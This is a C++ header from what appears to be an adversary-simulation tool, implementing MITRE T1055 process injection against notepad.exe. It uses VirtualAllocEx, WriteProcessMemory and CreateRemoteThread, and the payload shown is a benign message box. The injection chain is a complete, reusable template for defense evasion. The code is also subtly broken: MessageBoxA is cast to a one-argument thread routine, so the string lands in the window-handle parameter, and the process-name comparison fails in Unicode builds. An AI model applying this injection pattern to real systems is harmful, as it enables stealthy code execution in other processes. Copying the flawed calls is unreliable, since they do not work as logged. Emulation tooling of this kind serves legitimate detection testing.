#pragma once
#include "Application.h"
#include <Windows.h>
#include <TlHelp32.h>
#include <thread>
#include <chrono>


namespace CyberSim {

    class TechniqueT1055 : public ITechnique {
    public:
        TechniqueT1055() {
            m_info.id = "T1055";
            m_info.name = "Process Injection";
            m_info.tactic = "Defense Evasion";
            m_info.description = "Injects into a remote process (notepad.exe) using CreateRemoteThread.";
            m_info.platforms = { "Windows" };
            m_info.dataSource = "Process monitoring";
        }

        TechniqueInfo GetInfo() const override {
            return m_info;
        }

        bool Initialize() override {
            m_logs.push_back("Initialized T1055 - Process Injection");
            m_progress = 0.0f;
            m_info.isActive = true;
            return true;
        }

        void Execute() override {
            if (!m_info.isActive || m_executed) return;
            m_logs.push_back("Locating notepad.exe...");

            DWORD pid = FindTargetProcess("notepad.exe");
            if (pid == 0) {
                m_logs.push_back("Target process not found.");
                m_progress = 1.0f;
                m_executed = true;
                return;
            }

            HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
            if (!hProcess) {
                m_logs.push_back("Failed to open target process.");
                m_progress = 1.0f;
                m_executed = true;
                return;
            }

            const char* msg = "Hello from CyberSim!";
            SIZE_T size = strlen(msg) + 1;

            LPVOID remoteMem = VirtualAllocEx(hProcess, NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            if (!remoteMem) {
                m_logs.push_back("Failed to allocate memory in target process.");
                CloseHandle(hProcess);
                m_progress = 1.0f;
                m_executed = true;
                return;
            }

            BOOL writeOK = WriteProcessMemory(hProcess, remoteMem, msg, size, nullptr);
            if (!writeOK) {
                m_logs.push_back("Failed to write payload.");
                VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
                CloseHandle(hProcess);
                m_progress = 1.0f;
                m_executed = true;
                return;
            }

            HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
                (LPTHREAD_START_ROUTINE)MessageBoxA,
                remoteMem,
                0, NULL);

            if (!hThread) {
                m_logs.push_back("Failed to create remote thread.");
                VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
                CloseHandle(hProcess);
                m_progress = 1.0f;
                m_executed = true;
                return;
            }

            m_logs.push_back("Successfully injected message box into notepad.exe!");
            m_progress = 1.0f;
            m_executed = true;

            CloseHandle(hThread);
            CloseHandle(hProcess);
        }

        void Stop() override {
            m_info.isActive = false;
        }

        float GetProgress() const override {
            return m_progress;
        }

        std::vector<std::string> GetLogs() const override {
            return m_logs;
        }

    private:
        TechniqueInfo m_info;
        float m_progress = 0.0f;
        std::vector<std::string> m_logs;
        bool m_executed = false;

        DWORD FindTargetProcess(const std::string& name) {
            HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
            if (hSnap == INVALID_HANDLE_VALUE) return 0;

            PROCESSENTRY32 entry;
            entry.dwSize = sizeof(PROCESSENTRY32);
            if (!Process32First(hSnap, &entry)) {
                CloseHandle(hSnap);
                return 0;
            }

            do {
                if (name == entry.szExeFile) {
                    DWORD pid = entry.th32ProcessID;
                    CloseHandle(hSnap);
                    return pid;
                }
            } while (Process32Next(hSnap, &entry));

            CloseHandle(hSnap);
            return 0;
        }
    };

}